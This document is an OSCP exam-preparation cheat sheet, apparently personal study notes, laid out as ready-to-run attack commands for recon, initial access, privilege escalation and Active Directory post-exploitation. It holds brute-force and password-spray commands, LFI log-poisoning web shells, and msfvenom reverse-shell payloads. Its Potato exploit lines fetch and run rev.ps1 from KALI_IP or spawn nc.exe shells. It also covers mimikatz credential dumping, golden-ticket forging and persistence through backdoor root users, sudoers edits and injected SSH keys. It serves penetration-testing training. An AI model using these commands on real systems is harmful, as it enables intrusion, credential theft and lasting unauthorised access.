# OSCP cheat sheet 2023

## 0. Preparation
* Read the [OSCP dos and don'ts](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
* Practice taking screenshot while you hack
* Get a document file ready to paste your walkthrough screenshots

## 1. Recon/Enumeration

Recon/Enumeration is an essential OSCP skill. 
If you do have good recon skills, it makes the exam much easier.
The tools included in this cheat sheet might not be enough. 
The content is created based on my own revision

## Enumeration notes

### General things

* if you have only a username, let say john, 
 try the username as pass creds pair, john:john. This applies to all services

* if you see a web running a CMS/platform,
 try the default creds pair or simple things like admin:admin or admin:password.
 
* always try to start with simplest approach,
  do not over-complicated things
 
* if there is a file in ftp, smb or whatever share services.
Download it and check the content. If there is a list of passwords, save it to a file, enumerate for usernames then perform bruteforce attack. 
Also, using tools such as exiftool to check file attributes, e.g, authors, to enumerate potential usernames.

* Do not only rely on one tool, different tools may possibly provide different results

* Aggregate IMPORTANT enumerated info into a notes from the start so that you can reproduce the attack fast for the report,
also avoid looking and searching the actual long and detailed recon result again and again which can make you exhausted,
important means useful ports, harvested creds, PoC commands, etc.

### FTP
``` bash
# Check if path traversal enabled
# switch to binary if you are transferring binaries
ftp > binary
binary set to I 
```

### WEB
* use wget when you are downloading a file, it won't alter the modification time of the file. 

* Always view the page source code, critical info may hide in the page in form of comment 
  
* If the server redirect you to another hostname and it said not found, it is likely to be a vhost issue. Try `curl -v URL` see if the status code is redirection. If so, add the entry `IP DOMAIN_NAME` to /etc/hosts  

* See if CHANGELOG, robots.txt, sitemap or README file exist

## Tool
### nmap
```bash
# full ports scan
nmap -Pn -n -p- -vv --open -oN enum/nmapfullports ${IP}
# From the full port scan you may find non-standard port openning
# Further enumerate it with nmap version scan to find out what is running on that port. The -sV option is a must before you want to run any other script scan
nmap -Pn -n -p PORT(S) -sC -sV -vv --open -oN enum/nonstandardports ${IP}
# initial version scan
nmap -Pn -n -p -sC -sV -oN enum/nmapversion ${IP} -vv --open
# port knocking
for i in RANGE;do nmap -Pn -n -p $i --host-timeout 201 --max-retries 0 ${IP};done
# service vuln scan
nmap -Pn -n -p ${PORT} -sC -sV -oN enum/servicevulnscan ${IP}
# Use with proxychain, quite important in AD environment
# Specify ports to reduce scan time
proxychains4 -q nmap -Pn -n -sT -p PORT(S) -vv --open
```

### wpscan
```bash
# Depends on the time and resources you have, may choose vp first if limited resources
wpscan --url URL --plugins-detection aggressive -e vp
wpscan --url URL --plugins-detection aggressive -e ap
# Brute Force login, will take very long time. Not recommended unless you have short listed wordlist and usernames
wpscan --url http://IP/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
```

### hydra
```bash
# basic auth login
hydra -C WORDLIST -s PORT IP http-get URI 
# Use -L/-P for wordlist -l/-p for single username/password
#ssh
hydra -L user -P pass ssh://IP -s 22
# http post login
hydra -l user -P /usr/share/wordlists/rockyou.txt IP http-post-form "/index.php:fm_usr=user&fm_pwd=^PASS^:Login failed. Invalid"
# ftp
hydra -L USER -P pass ftp://IP
# If your hydra attack runs more than 15 mins, probably you have done something wrong
```

### External Process enumeration with LFI
```bash
#to find out which process id is running on the targert port
# 1337 in this case
i=0; MYVAR=""; while [[ $MYVAR != *"1337"* ]]; do MYVAR=$(curl -s http://PATH/TO/LFI?PARA=/proc/$i/cmdline); echo $i; ((i=i+1)); done; 
```

### web enum
```bash
# Web dir enum
gobuster dir -u URL -w WORDLIST -t THREADS -x EXTENSION(S) -o OUTPUT_FILE
feroxbuster -u URL -t THREADS -w WORDLIST -x EXTENSION(S) -v -k -n -q -e -r -o OUTPUT_FILE
# Web server version quick enum
curl -I URL
```

### odat
```bash
# execute the odat with sidguesser
odat sidguesser -s IP -p 1521#default port
# wordlist for creds bf
cp /usr/share/metasploit-framework/data/wordlists/oracle_default_userpass.txt .
# replace the space in each entry by `:%s/ /\\//g`
odat passworguesser -s IP -d SID 
# The following commands need the user profile to be db admin
# File upload
odat dbmsxslprocessor -s IP -d SID -U USER -P PASS --sysdba --putFile "C:\\inetpub\\wwwroot\\" "output_name" input_file
# There are several command for executing binary via odat, this is just one of them
odat external table -s IP -d SID -U USER -P PASS --sysdba -exec /temp LOCAL_EXPLOIT_BINARY
```

### snmpwalk and snmpbulkwalk
```bash
# Check if any snmp extended object for code execution
snmpwalk -v X -c public ${IP} NET-SNMP-EXTEND-MIB::nsExtendOutputFull
# For the bulkwalk, may look for SWRun. 
snmpbulkwalk -Cr1000 -c public  -v 2c ${IP} . > snmpbulkwalk
```
> The SWRunName stands for the software binary name. And SWRunPath stands for where the binary from. The SWRunParameters shows the parameters passed into the binary, which potentially got some info exposed to us that we may abuse.

### SMB client
```bash
smbclient \\\\IP\\ -L -N
# If somehow the above command does not work (showing access denied)
smbclient \\\\IP\\ -L -N -I IP
# use the similar command option to login to the share
smbclient \\\\IP\\SHARE -N -I IP
```

### SMBmap
```bash
# domain is optional, may put -u '' -p '' to confirm null session access
smbmap -H IP -d DOMAIN -u domain_user -p pass -H IP
# depth probably > 5 if you wanna traverse and search deep into a share
smbmap -H IP -R SHARES -A PATTEN --depth 6 -q
```

### cme (critical for AD)
``` bash
# Use quotes for -p if your password has a speicial character
# proxychains4 is optional depends whether you are working against an internal network
# put USER as '' and PASS as '' for null session check
# Check pass pol before bruteforcing to avoid lockout
cme smb IP -u USER -p PASS --pass-pol
# cme bruteforce
proxychains4 -q cme smb DOMAIN_NAME -u USERS -p PASS   --continue-on-success
# cme password spray
proxychains4 -q cme smb DOMAIN_NAME -u USERS -p PASS --continue-on-success
# cme creds attempt not brute force
proxychains4 -q cme smb DOMAIN_NAME  -u USERS -p PASS --continue-on-success --no-bruteforce
# check if creds reused and see permissions to shares
for each in $(cat hosts.txt);do cme smb $each -u USER -p PASS --shares;done
# Grep user list, look for sid > 1000, not always work
cme smb DOMAIN -u guest -p '' --rid-brute | grep  SidTypeUser
# Pass the hash
cme smb IP -u USER -H NTLM_HASH
# enumerate shares
cme smb IP --shares -u USER -p PASS 
# Enumerate access
# if smb show pwned, means psexec and smbexec can be used for shell access
cme smb IP -u USER -p PASS 
# if winrm show pwned, means evil-winrm can be used for shell access
cme winrm IP -u USER -p PASS 
# ssh is quite self-explanatory
cme ssh IP -u USER -p PASS
# if mssql show access granted, try sqsh to SQLi to RCE
cme mssql IP -u USER -p PASS 
# try to authenticate as local computer administrator
cme smb IP -u Administrator -p PASS --local-auth
```

### Autorecon
```bash 
# This tool takes significant amount of time
# And require a lot of pre-configuration
# Strongly recommend getting familiar with the above manual tool b4 using this
# Use it with a list of IPs
autorecon -t hosts.txt -vv
```

### NFS mounting
| action    | command    |
| --- | --- |
| Show available directories | showmount -e ${IP} |
| mount | mount ${ip}:/vol/share /mnt/nfs |
| unmount | umount -f -l tmp |

### kerbrute
``` bash
# userenum
# --dc can also be dc ip
kerbrute userenum --dc DC_NAME -d DOMAIN_NAME USER.txt
# password spray
kerbrute passwordspray --dc DC_IP -d DOMAIN_NAME USERS.txt PW
```

### fuzzer tool
```bash
# GET req
wfuzz -u http://${IP}/path/index.php?param=FUZZ -w /usr/share/wordlists/rockyou.txt
# POST req
wfuzz -u http://${IP}/path/index.php?action=authenticate -d 'username=admin&password=FUZZ' -w /usr/share/wordlists/rockyou.txt
# Subdomain virtual host enumeration
ffuf -w /path/to/wordlist -u https://target  -H 'Host: FUZZ.TARGET.DOMAIN'
# Find log file for poisoning
cat /usr/share/SecLists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt | grep log > log.txt 
ffuf -u http://${IP}/LFI.php?file=FUZZ -w log.txt -fr "Failed opening" -o fuzz.txt 
```

## 2. Initial Access
This is the way of getting foothold as a low privileged user on the server.
### Public exploit
First thing you need to learn is locating public exploit and how to use it.
Most of the time you may find a public exploit in exploit-db (web version), searchsploit (cli version) or github. 
Using github exploit is just similar methodology,
but instead of using searchsploit cli tool,
you go to google search it.

Most of the time you obtained an application name and version,
you should go and see if public exploit available.
You will need to see if the version is vulnerable to something that may gain you access.

A word press plugin mail masta is being used as example. 
```bash
# search for relavant vulnerabilities
searchsploit wordpress mail masta
# From the search, we can see one txt and py file related to a LFI vuln
# We can view the content of exploit file without downloading it
searchsploit -x php/webapps/40290.txt
# Always try to automate the exploit so I will go for the py script
searchsploit -m php/webapps/50226.py
# The exploit won't work if you blindly copy and run
# Read the exploit script before execution.
# In this case a wordlist.txt is required, create the relavant file and run again
# When working on public exploit, there are several things that you may have to change
# 1. Port, the service may run on a non-default port, 
#    and the rev shell port maybe hardcoded
# 2. IP, the target ip and the rev shell ip used may be hardcoded
# 3. URL/URI, the web service may have a different path
#    In the example, if the wordpress is running under /wp, 
#    I will have to add /wp to my exploit script where appropriate.
# 4. Payload name, you may need to use a customised payload 
#    in the exploit script
```

### Common Web App vuln
If cannot locate a public exploit, you may need other means for getting the initial foothold.
### Arbitrary File Upload
If the site has a file upload function, and you know where is the 
upload directory (maybe in /uploads).

Locate your payload in /usr/share/webshells/, upload the corresponding script file.
Then navigate to http://IP/uploads/webshell.php. `webshell.php` is just an example, you need to navigate to the corresponding uploaded file.
If you are using payload like simple-backdoor.php, which does not do automatic payload execution and wait for user input
, you will need to navigate to http://IP/uploads/simple-backdoor.php then append `?cmd=PAYLOAD` or the payload will be received as post form data.

### Insecure deserialization

* [jsonpickle](https://versprite.com/blog/application-security/into-the-jar-jsonpickle-exploitation/)
* [python payload generator](https://github.com/j0lt-github/python-deserialization-attack-payload-generator)
* [All other langauges payload list](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization)

### File Inclusion to RCE
The log poisoning is not necessary targeting php, it is just a common example being used.
You may need to either upload the web shell that need to be included or inject with other languages.
```bash
#POC LFI, check /etc/passwd
http://IP/?FI=/etc/passwd
#or
http://IP/?FI=../../../../../../../../etc/passwd
#if there is any user has shell login
http://IP/?FI=/home/user/.ssh/id_rsa
# more advanced filter see https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/README.md
# RFI, rare since it is not enabled by default
# Setup a http server contains a reverse shell script
# send request then it will be invoked
http://IP/?FI=http://YOUR_IP/YOUR_PAYLOAD
# access log poisoning with ssh
ssh '<?php system($_GET['cmd']); ?>'@IP 
# access log poisoning with http
nc -nv IP HTTP_PORT
<?php system($_GET['cmd']); ?> #<- then click on return key twice and you should see a bad request respond
# SMTP injection
http://IP/FI?=/var/mail/TARGET_USER&cmd=id
# extension append filter
# data, can execute code directly
http://IP/FI?=data://text/plain,<?php phpinfo(); ?>
http://IP/FI?=data://text/plain,<?php shell_exec("PAYLOAD"); ?>
# data and base64 encode to code execution
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==
http://IP/FI?=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls
# base64, can check file source
http://IP/FI?=php://filter/convert.base64-encode/resource=FILE
```

Remote file inclusion is rarely enabled but it can be done in this way,
put your payload into PAYLOAD.EXT, replace PAYLOAD to any preferred file name
and replace .EXT to any applicable extension
```
http://IP/FI?=http://YOUR_KALI_IP/PAYLOAD.EXT
```

#### SMTP code injection associate with LFI to RCE
```bash
#Connect to the smtp port with nc/telnet
EHLO who_you_are
VRFY TARGET_USER
mail from:you
rcpt to: TARGET_USER
data
Subject: WHATEVER
<?php echo system($_REQUEST['cmd']);?>
    #<- this extra newline is essential
.   #<- also this period is essential
```

#### LFI notes
* /proc/self/status can see the web server current run as which user and proc id etc
* /proc/self/environ see process environment variable, potential password stored in env
* /var/log/apache2/access.log is one example of log paths, may fuzz with these [lists](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion/Intruders) to see which files are usable
* /var/mail/TARGET_USER, at the end of request add a &cmd to execute command
* if you have write access to the host, upload a file that the host, use LFI filter to check if the file uploaded correctly(path and extension), remove the base64 wrapper for execution
* [null byte termination](https://gabb4r.gitbook.io/oscp-notes/web-http/lfi-and-rfi/null-byte-injection) `%00` only works before php 5.3
* if none of these work, try to view config.php,db_connect.php and see if they left any creds

### webdav
```bash
davtest -url IP -sendbd auto
# see want can be sent and executed
# say if txt and html can be executed
# copy your web shell and name it as .txt
curl -X PUT http://IP/shell.txt --data-binary @shell.txt 
curl -X MOVE -H "Destination:http://IP/shell.aspx" http://IP/shell.txt
```

### tomcat 
```bash
# use the enumerated login for manager portal
# create payload, add EXITFUNC=thread if target is Windows
msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war -o rev.war
# go to manager panel -> war file to deploy
# click on the deployed war url for invoking reverse shell
```

### ShellShock

```bash
curl -A "() { :; }; PAYLOAD" http://IP/cgi-bin/cgi-script 
 
curl -H "User-Agent: () { :; }; PAYLOAD" http://IP/cgi-bin/cgi-script
```

### drupal
``` bash
droopescan scan -u IP
# initial shell(limited function) 
# https://github.com/dreadlocked/Drupalgeddon2 
# only command execution 
# https://github.com/Jack-Barradell/exploits/blob/master/CVE-2018-7600/cve-2018-7600-drupal7.py
```

### James Admin Server initial foothold & POP3
```bash
# If you find something on port 4555 and also running POP3
# try login to port 4555 via telnet with root:root
# if you successfully login, run
listusers
# reset all the password
setpassword USER 123
#Then connect to port 110 POP3, login all user account to read the mail
USER USER
PASS 123
LIST
RETR 1
```

### Wordpress non public exploit
* if able to login to the admin panel
  * go to apperance and select 404.php, replace content with reverse shell payload, setup listener, go to nonexisting page
  * [plugin shell upload](https://sevenlayers.com/index.php/179-wordpress-plugin-reverse-shell)

### prtg
* [Python2 exploit](https://github.com/wildkindcc/CVE-2018-9276/blob/master/CVE-2018-9276.py )
* [Python3  exploit](https://github.com/A1vinSmith/CVE-2018-9276/blob/main/exploit.py )

### nibbleblog
* [Shell upload script](https://github.com/dix0nym/CVE-2015-6967)
```
python nibble.py --url URL --username USER --password  PASS -x PAYLOAD
```

### post form login bypass with type juggling
* if server using php post form login,
may check php type juggling
just add a `[]` between `password` and `=`

### code injection with phpliteadmin
* create a new database with name anything.php
* create new table name as shell with number of field 1
* 1 variable be name shell, type TEXT and default value <?php system($_GET[cmd])?> 
* trigger it with LFI, the file probably in /var/tmp/anything.php
* use with &cmd=command

### wekzeug console pin exploit
[Exploit guide](https://www.daehee.com/werkzeug-console-pin-exploit/)
``` bash
# copy the exploit script and fill in all public and private bits
# getattr(mod, '__file__', None) is the absolute path of an app.py in the flask directory(see traceback)
# mac address = /sys/class/net/eth0/address
echo MAC | tr -d ":" #get the correct format
python -c 'print(0xFORMMATED_STRING)'#get the decimal value of the address
# For machine_id, check either
/etc/machine-id
/proc/sys/kernel/random/boot_id
# cgroup value
/proc/self/cgroup
#append the cgroup id to machine id
#then run the script to get PIN
#might have to change the hash type if the created PIN is incorrect
```

### SSRF to LFI
[SSRF to LFI](http://hassankhanyusufzai.com/SSRF-to-LFI/)
```bash
# Payload to check if the app vulnerable to SSRF
http://localhost:HTTP_PORT
# If it has a valid respond
file:///etc/passwd
```

### XXE
[detail guide](https://portswigger.net/web-security/xxe)

Example paylaod
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<creds>
    <user>&xxe;</user>
    <pass>mypass</pass>
</creds>
```

### Python SSTI
```python
{% import os %}{{os.system('PAYLOAD')}} 
```

### Binary payload injection(msfvenom)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT EXIT_FUNC=thread -f exe -e x86/shikata_ga_nai -i 9 -x VALID_BINARY -o bad_binary.exe
```
## Non web vuln
Some services may have vulnerabilities that allow you to gain shell access.

### from xp_cmdshell to shell (may see in AD env)
```bash
# If you are doing it against a host in different subnet, set up the proxy then execute with proxychians
sqsh -S IP -U DOMAIN_OR_HOST_NAME\\USER -P PASS
exec sp_configure ‘show advanced options’, 1;
reconfigure;
exec sp_configure ‘xp_cmdshell’, 1;
reconfigure;
\go
xp_cmdshell 'PAYLOAD';
\go
```

#### Samba Eternal Red
[Exploit 1](https://redteamzone.com/EternalRed/)

[Exploit 2](https://github.com/joxeankoret/CVE-2017-7494)

[Exploit 3](https://github.com/opsxcq/exploit-CVE-2017-7494)
``` bash
#check if the host is vulnerable
nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version –p445 IP 
```

#### Samba 3.0
[Exploit 1](https://github.com/amriunix/CVE-2007-2447)
[Exploit 2](https://gist.github.com/joenorton8014/19aaa00e0088738fc429cff2669b9851)
```bash 
# Create payload with
msfvenom -p cmd/unix/reverse_netcat LHOST=IP LPORT=PORT -f python
```

#### Eternal Blue
``` bash
#https://github.com/helviojunior/MS17-010
#Generate payload in exe format and use the send_and_execute.py
msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=IP LPORT=PORT -f exe -o payload.exe
python2 /opt/MS17-010/send_and_execute.py TARGET_IP payload.exe
# If this does not work, use the paylaod created by the following commands
msfvenom -p windows/x64/shell_reverse_tcp -a x64 LHOST=IP LPORT=443 -f raw -o sc_x64_payload.bin
nasm -f bin eternalblue_kshellcode_x64.asm -o ./sc_x64_kernel.bin
cat sc_x64_kernel.bin sc_x64_payload.bin > sc_x64.bin
```

### Responder hash stealing
set responder
```
responder -I tun0
```
To launch the attack remotely, use `file://IP/file` instead of http/smb etc

To launch the attack locally (in a windows host), use `net use Y: \\KALI_IP\share`

crack the captured hash with hashcat mode 5600

## 3. File Transfer
### Linux target
```bash
## HTTP
# Kali side
python3 -m http.server 80
# Target side
wget/curl KALI_IP/FILE
## nc
# Receiver
nc -lvnp PORT > FILE
# Sender
nc -nv Receiver_IP PORT < FILE
```

### Windows Target
#### HTTP
```bash
# Kali side
python3 -m http.server 80
```
```powershell
# powershell way
powershell iwr http://KALI_IP/FILE -outfile .\FILE
# Certutil cmd
certutil.exe -urlcache -f http://KALI_IP/FILE OUTPUT_PATH
# if via web shell
cmd.exe /c certutil.exe -urlcache -f http://KALI_IP/FILE OUTPUT_PATH
```

#### SMB (recommended)
```bash
# Kali side
impacket-smbserver share . -smb2support -username USER -password PASS
```
```cmd
# Windows side
net use Y: \\KALI_IP\share /user:USER PASS
# After established connection
# Transfer from windows to Kali
copy FILE Y:\
# Transfer from kali to windows
copy Y:\File .\
```

#### AD specified situation
Sometimes you pivoted to an internal facing only computer in an AD environment,
you might need to transfer files for post exploitation or local enumeration.
These are the possible ways to do so.

a. SMB

Let say the first computer has a non-default shares
and you already got admin shell access to the first computer, 
and you are initally on the second computer with non-privileged access
and you need to transfer a binary(e.g. sharpup.exe). 
First step you need to do is enumerate the share name and also its local path, run a powershell command
```powershell
# wrap it with powershell -ep bypass if you are having a cmd session
# Run this in the first computer
get-smbshare
```
Once you have obtained the network share name and the local path.
In the second computer, you run
```powershell
net use X: \\FIRST_COMPUTER_NAME\SHARE_NAME ADMIN_PASSWORD /user:Administrator
```
If you don't have admin password, you can modify it with 
```powershell
# Run it in the first computer
net user Administrator NEW_PASSWORD
```
Once the net use command executed successfully,
 you can copy file from Kali to the first computer, 
then from first computer to second computer, vice versa
```powershell
copy X:\FILENAME .\FILENAME
```

b. HTTP

Sometimes you might not have non default shares that you may write to,
 but if the first computer has http service running,
 go to the web root directory(usually C:\\inetpub\\wwwroot).
 Place files there and retrieve it with wget or other tools like IWR

c. WINRM
 If you have winrm access with evil-winrm, 
 you can use the upload and download keywords to transfer files.
 It is the simplest way to transfer files.

## 4. Priv Esc
PE techniques let you get root/administrator access to the system
### Local Enumeration Tool
[Linpeas, Winpeas](https://github.com/carlospolop/PEASS-ng/tree/master) for informative system enumeration

[pspy](https://github.com/DominicBreuker/pspy) for linux process monitoring

[SharpUp, Seatbelt](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) for windows priv esc vector

[Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries) for active directory attack in windows host

### Checklist
```bash
# check if any notes useful in your landing directory with
ls -la # linux
# Check history file
cat /home/USER/.bash_history
```
```powershell
gci -force 
gc C:\users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```

### Linux binary exploit
If the linpeas enum highlighted some binaries for exploit, check

[GTFObins](https://gtfobins.github.io/)



### Path injection or relative path exploit
```bash
# If there is an unknown SUID invoking another binary 
# that does not use absolute path
# And you can manipulate the PATH variable
# Create that binary like
echo "#!/bin/bash" > /tmp/THAT_BINARY
echo "/bin/bash -ip" >> /tmp/THAT_BINARY
export PATH=/tmp:$PATH
# Execute the suid binary and you will get root
```

### Cron job abuse/general priv esc techniques
``` bash
# For cron job, there are many things you can use as a payload
# Modify or create the script
#1. Add sticky bit to the bash file
chmod u+s /bin/bash
#or 
cp /bin/bash /tmp/bash; chmod u+s /tmp/bash
2. Add sudoers
echo "CURRENT_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 
#3. Call reverse shell
#add reverse shell payload to the script
#4. add new privileged user to /etc/passwd
#Create a new user password with openssl in the target machine
openssl passwd 123
#append the new user to /etc/passwd in such format 
echo "Fakeuser:${HASH}:0:0:root:/root:/bin/bash" >> /etc/passwd
# if there is a $ in the hash, you might have to escape it with \
```
### Modifiable service script exploit
If a service script (.service file or the script used in `ExecStart`) is writable,
you can replace the `ExecStart` part with your PE payload.
Or replace the content of the script which called by the `ExecStart`.
The payload and methodology can be any of the general priv esc tehcniques

### Library Hijack
[Python lib hijack](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/)

Just add the reverse shell python code at the end of the writable library py file


### fail2ban
```bash
# https://systemweakness.com/privilege-escalation-with-fail2ban-nopasswd-d3a6ee69db49
# modify /etc/fail2ban/action.d/iptables-multiport.conf
# replace the actionban = PAYLOAD #could be anything as long as it helps you PE(reverse shell, suid...)
# could use a script to help you
#!/bin/bash
cp ./iptables-multiport.conf.bak ./iptables-multiport.conf
mv ./iptables-multiport.conf /etc/fail2ban/action.d/iptables-multiport.conf
sudo /etc/init.d/fail2ban restart
```

### webmin
if you have webmin admin panel login, go into the admin panel
create a new user with any username but User ID 0 & group id 0

### git commit exploit
```
# edit .git/hooks/pre-commit
# Or may use a rev shell command
#!/bin/sh
mkdir -p /home/user/.ssh
print "\n${SSH_PUBLIC_KEY}" >> /home/user/.ssh/authorized_keys
chmod 600 /home/user/.ssh/authorized_keys
```
Then add a file
```
git --work-tree /etc add /etc/passwd
```
Then commit to exploit

### Modifiable service binary & Unquoted Path service
```bash
# Run SharpUp.exe to find if any service binary is writable or any unquoted path service
# If found anything, run msfvenom to create a service binary
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=KALI_PORT EXIT_FUNC=thread -f exe-service -o SERVICE_NAME.exe
```
Transfer the exploit binary to the windows target
```powershell
# For writable binary service
copy SERVICE_NAME.exe C:\PATH\TO\ORIGINAL\SERVICE\BINARY.exe
# For unquoted path, let say the service binary is in 
# C:\Program Files\A Subfolder\B Subfolder\C Subfolder
# while we can write to "A subfolder" directory
copy SERVICE_NAME.exe "C:\Program Files\A Subfolder\B.exe"
# Restart service
sc.exe stop SERVICE_NAME
sc.exe start SERVICE_NAME
```

### tar wildcard exploit
If the cron script or the sudo rule allowed something be like
```
tar cf FIXED_TAR_NAME *
```
Create a script with following content
```
#!/bin/bash
cp /bin/bash /tmp/bash && chmod 4755 /tmp/bash
```
Then create some more files in the script's directory
```
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```
Then when running the script, it will be interpreted as
```
tar cf FIXED_TAR_NAME --checkpoint=1 --checkpoint=action=exec=sh shell.sh
```
Go to /tmp will find a suid set bash

### UACBypass
If you already in a user profile which is a admin group user,
but you are not having a high mandatory level shell.
You need UACBypass exploit to get admin shell.

#### CLI version
It is more complicated with CLI UACBypass. First will need to check if the UAC is really bypassable
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System 
```
If the return `ConsentPromptBehaviorAdmin` value is 5, it means it is using the default setting for UAC. 

[UAC bypass exploit](https://github.com/ScriptKiddieTutorials/Bypass-UAC) (very useful for ARM devices since it does not require compilation)

To use the ps1 exploit, simply modify the last line of elev-function.ps1
to your desired payload, maybe a reverse shell payload created by msfvenom 
or using nc.exe to call a reverse shell.

#### GUI version
If you somehow obtain a GUI access like RDP, you simply need to right click the command prompt or powershell icon and select `run as administrator`

### local hash dump
If SAM file and SYSTEM file are available without getting admin access, use impacket-secretsdump
```bash
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```
Then save the admin hash to a file and  crack the admin hash with hashcat
```bash
hashcat -m 1000 admin.hash /usr/share/wordlists/rockyou.txt
```

### PE with service all access
```powershell
sc qc SERVICE
sc config SERVICE binPath= "cmd.exe /c powershell.exe -enc BASE64_PAYLOAD"
```

### Windows SEImpersonate privilege exploit
[Juicy Potato](https://github.com/ohpe/juicy-potato)

[God Potato](https://github.com/BeichenDream/GodPotato)

[Sweet Potato](https://github.com/uknowsec/SweetPotato/blob/master/README.md)
```
# Juicy Potato
# remember to specify /c since we are passing in arguments to cmd.exe
juicy.exe  -l 12345 -p C:\Windows\system32\cmd.exe -a "/c c:\windows\Temp\nc.exe -e cmd.exe KALI_IP 4443" -t * -c "CLSID" 
#call a ps session
\juicy.exe  -l 12345 -p C:\Windows\system32\cmd.exe -a "/c powershell -ep bypass IEX(New-Object Net.WebClient).downloadString('http://KALI_IP/rev.ps1')" -c "CLSID"
#god potato
.\potato.exe -cmd "cmd /c powershell -ep bypass IEX(New-Object Net.WebClient).downloadString('http://KALI_IP/rev.ps1')"
#sweet potato
.\potato.exe -a "powershell.exe -ep bypass IEX(New-Object Net.WebClient).downloadString('http://KALI_IP/rev.ps1')"
```

### CVE 2021-3034 PwnKit exploit
[Python 3](https://github.com/joeammond/CVE-2021-4034/blob/main/CVE-2021-4034.py )

[Python 2](https://gist.github.com/Ayoub-2/9f52583daec92ba2d81b4c4b4cbfe902)  

[C/sh](https://github.com/ly4k/PwnKit )

### CVE 2021-3560 polkit exploit

[python3](https://github.com/Almorabea/Polkit-exploit)

[sh](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)  

## 5. Post Exploitation and AD-related Enumeration
There might be some valuable information for pivoting over an organizational network, post exploitation is necessary.
### Creds harvesting
#### Useful tools
[LaZagne.exe](https://github.com/AlessandroZ/LaZagne)

[mimikatz.exe](https://github.com/ParrotSec/mimikatz/tree/master)

[Rubeus](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)

```powershell
.\LaZagne.exe all -oN
.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "exit" > .\sekurlsa_logonpassword.txt
.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "lsadump::secrets" "lsadump::cache" "exit" > lsadump_dump.txt
# Start impacket smbserver before run next
net use X: \\IP\share /user:USER PASS
reg save HKLM\SAM C:\users\public\SAM
reg save HKLM\SYSTEM C:\users\public\SYSTEM
copy .\*.txt X:\hashes\
copy C:\users\public\S*M X:\dump\
# Try ASREP roast and kerberoast inside a domain-joined computer
.\Rubeus.exe asreproast /outfile:hash.txt
.\Rubeus.exe kerberoast /outfile:hash.txt
```

### ASREP and kerberoast from remote
```bash
# Kerberoasting
GetUserSPNs.py -dc-ip DC_IP -request FQDN/USER:PW
# ASREP roast, pick the format as hashcat or john
GetNPUsers.py DOMAIN_NAME/DOMAIN_USERNAME:PASSWORD -request -format [hashcat|john] -outputfile FILE_NAME
```

### DC sync hashes dump
If you find out someone has a DC sync right through bloodhound
or you obtained Domain Administrator access. Run a DC sync to get all
stored domain user creds.
```bash
secretsdump.py FQDN/USER:PW@DC_IP # may add -just-dc and -just-dc-ntlm according to the need
```

### Get access with ticket
After getting the hashes, if most hashes are unusable and the krbtgt one is available.
You can try generating a golden ticket with its NTLM hash. But will need to enumerate for extra info.
```powershell
Get-ADDomain DOMAIN_NAME # This to get the domain sid
```
Then perform the ticket attack with enumerated info
```bash
ticketer.py -nthash KRBTGT_NTLM_HASH -domain-sid DOMAIN_SID -domain FQDN DOMAIN_USER
```
After getting the ticket, export the TGT for impacket tool
```bash
export KRB5CCNAME=TGT_FILENAME
psexec.py  DOMAIN_NAME/DOMAIN_USER@TARGET_HOST -k -no-pass # Not necessary to be psexec, can use smbexec or any other similar tools.
```

### Cracking harvested hashes
Mscache v2 hashes cracking:

Need to parse hashes into such format:
```
$DCC2$10240#username#hash
```
Then crack with
```bash
#Mscache V2
hashcat -m 2100
#Kerberoast
hashcat -m 13100
#ASREP roast
hashcat -m 18200
#NTLM
hashcat -m 1000
#responder hash
hashcat -m 5600
```
#### Encrypted file hash cracking
Common files like zip, 7z, rar, keepass, sshkey
```
zip2john > zip.hash
7z2john > 7z.hash
rar2john > rar.hash
keepass2john > kee.hash
john *.hash
```

### Useful Windows access
When you have Admin creds, try winrm and rdp for shell/GUI access
```bash
# winrm
evil-winrm -i IP -u USER -p PASS
# rdp, /d is optional
xfreerdp /v:IP /u:USER /p:PASS /d:DOMAIN
```

### Enumerate certain directory and find all txt files
```powershell
gci -force -recursive -Path 'C:\users\' -include *.txt
```

### Persistent foothold
After gaining the the system/root access of the system.
Adding another root/administrator user to the system for future access so that you don't have to hack into again.
#### Linux
```bash
# 1. Add an entry to /etc/passwd manually
openssl passwd YOUR_PW #Generate the password hash
echo "Fakeuser:${HASH}:0:0:root:/root:/bin/bash" >> /etc/passwd
# Use this profile to access as root
# 2. SSH key injection
# Use existing ssh key or create one
ssh-keygen # to create ssh key
cat id_rsa.pub # copy the content then return to the target
echo "PUB_KEY_CONTENT" >> ~/.ssh/authorized_keys
```
#### Windows
```powershell
# 1. Inject admin group user
net user tmp PW /add
net localgroup Administrator tmp /add
# Then use winrm/rdp to access if available
# 2. If you own the admin creds/hash
# smbexec.py for administrator shell
